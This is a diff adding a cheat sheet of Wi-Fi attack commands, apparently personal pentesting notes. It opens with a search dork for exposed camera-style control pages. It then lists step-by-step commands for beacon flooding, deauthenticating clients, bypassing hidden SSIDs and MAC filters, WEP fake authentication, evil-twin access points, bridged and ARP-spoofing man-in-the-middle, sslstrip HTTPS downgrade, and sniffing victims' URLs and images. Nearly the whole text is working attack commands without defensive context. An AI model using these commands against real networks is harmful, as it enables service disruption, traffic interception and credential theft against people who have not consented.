@@ -1,0 +1,107 @@
+inurl:/control/userimage.html
+
+
+airmon-ng start wlp3s0      # start monitor mode with a new interface
+airmon-ng
+wireshark
+iwconfig wlp3s0 channel 1   # schange interface listening channel
+airodump-ng --band bg wlp3s0mon     # listening for SSIDs
+
+mdk3 --help b       # beacon flood help info
+mdk3 wlp3s0mon b -n wifitest        # create new ap with a specific SSID using beacon
+
+
+# pwning hidden SSID
+airodump-ng --channel 11 wlp3s0mon      # passive way
+aireplay-ng --deauth 0 -a BSSID wlp3s0mon   # active way
+
+
+# MAC filter
+airodump-ng
+iwconfig wlp3s0mon channel 10
+iwconfig wlp3s0 channel 10
+wireshark
+aireplay-ng --fakeauth 10 -e wificomeback wlp3s0mon
+
+aireplay-ng --fakeauth 10 -e wificomeback -h [CLIENT_MAC_ADDR] wlp3s0mon
+
+
+# shared auth
+# 1. client -> AP  auth
+# 2. AP -> client  challenge [X]
+# 3. client -> AP  wep keystream [Y] [Z] Z = X xor Y
+# 4. AP -> client  check  Z xor X = Y
+
+# demo-01.cap  demo-01***.xor
+airodump-ng --channel 11 wlp3s0mon --bssid [MAC_ADDR] --write demo
+wireshark wep-01.cap
+
+airodump-ng --channel 11 wlp3s0mon --bssid [MAC_ADDR] --write fakeAuth
+aireplay-ng --fakeauth 10 -e wificomeback -y demo-01***.xor wlp3s0mon
+wireshark fakeAuth-01.cap
+
+
+# hotspot attack
+# create fake SSID
+# use de-auth to break client connection
+# if the signal strength is stronger, then client will connect to it
+airodump-ng wlp3s0mon       # get SSID MAC_ADDR
+iwconfig wlp3s0 channel 11
+iwconfig wlp3s0mon channel 11
+
+airbase-ng -a AA:AA:AA:AA:AA:AA -e [fakeESSID] wlp3s0
+
+ifconfig at0 up
+aireplay-ng --deauth 0 -a [targetBSSID] wlp3s0mon
+wireshark           # interfaceat0
+ifconfig at0 [IP_ADDR_IN_SAME_RANGE_OF_THE_TARGET] netmask 255.255.255.0
+ping [TARGET_IP]
+
+
+# attack isolated client
+airodump-ng wlp3s0mon
+wireshark
+
+airbase-ng -a AA:AA:AA:AA:AA:AA --essid [fakeESSID] wlp3s0
+airbase-ng  -P -C -a AA:AA:AA:AA:AA:AA wlp3s0
+
+
+# set wifi to any channel
+# https://git.kernel.org/cgit/linux/kernel/git/linville/wireless-regdb.git/tree/db.txt
+iwconfig wlp3s0 channel 1
+ifconfig wlp3s0 down
+iw reg set US
+iwconfig wlp3s0 up
+iwconfig wlp3s0 channel 12
+iwconfig txpower 27
+
+
+# MITM man in the middle
+airbase-ng -a AA:AA:AA:AA:AA:AA --essid [fakeESSID] wlp3s0
+
+ifconfig at0 up
+brctl addbr bridge          # bridge-utils
+brctl addif bridge eth0
+brctl addif bridge at0
+ifconfig eth0 0.0.0.0 up
+ifconfig at0 0.0.0.0 up
+ifconfig bridge up
+dhclient bridge &
+
+aireplay-ng --deauth 0 -a [targetBSSID] wlp3s0mon
+wireshark at0
+
+
+# SSL MITM
+dnsspoof -i bridge
+burpsuite       # proxy
+
+
+# MITM arpspoof and sniff
+echo 1 >  /proc/sys/net/ipv4/ip_forward
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+arpspoof
+sslstrip -k -l 8089 -w ./sslstrip.log               # https -> http
+driftnet -v -d ./tmp/ -a -m 200 -i wlp3s0           # images
+urlsnarf -i wlp3s0                                  # urls
+wireshark
